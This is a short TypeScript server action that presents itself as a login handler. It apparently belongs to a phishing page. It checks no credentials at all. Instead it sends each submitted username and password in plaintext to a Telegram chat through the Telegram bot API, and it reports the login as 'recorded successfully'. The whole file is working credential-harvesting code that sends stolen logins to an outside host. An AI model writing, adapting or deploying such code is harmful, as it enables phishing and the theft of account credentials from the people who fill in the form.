"use server"

export async function handleLogin(username: string, password: string, chatId: string) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN
    if (!botToken) {
      throw new Error("Telegram bot token not configured")
    }

    const message = `🔐 New Login Attempt\n\n👤 Username: ${username}\n🔑 Password: ${password}`

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      throw new Error("Failed to send message")
    }

    return {
      success: true,
      message: "Login attempt recorded successfully.",
    }
  } catch (error) {
    console.error("Login error:", error)
    return {
      success: false,
      message: "An error occurred. Please try again.",
    }
  }
}

